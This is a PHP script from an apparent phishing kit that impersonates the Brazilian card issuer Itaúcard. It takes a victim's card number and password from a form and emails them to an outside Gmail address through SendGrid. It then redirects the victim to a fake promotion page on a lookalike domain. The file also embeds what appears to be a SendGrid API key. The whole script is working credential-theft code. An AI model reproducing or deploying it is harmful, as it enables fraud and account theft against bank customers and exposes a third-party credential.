<?php
		
	$login = $_POST['numc'];
	$senha = $_POST['passc'];
	
        require 'vendor/autoload.php';

        $from = new SendGrid\Email(null, "apple-tope@live.com");
        $subject = "Chegou novos dados";
        $to = new SendGrid\Email(null, "marcos985970@gmail.com");
        $content = new SendGrid\Content("text/html", "CC: $login - Senha: $senha");
        $mail = new SendGrid\Mail($from, $subject, $to, $content);
        
        //Necessário inserir a chave
        $apiKey = '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';
        $sg = new \SendGrid($apiKey);

        $response = $sg->client->mail()->send()->post($mail);
		
	header('Location: https://itaucardcartoes.lordbrasil.info/promocao.html');
        ?>
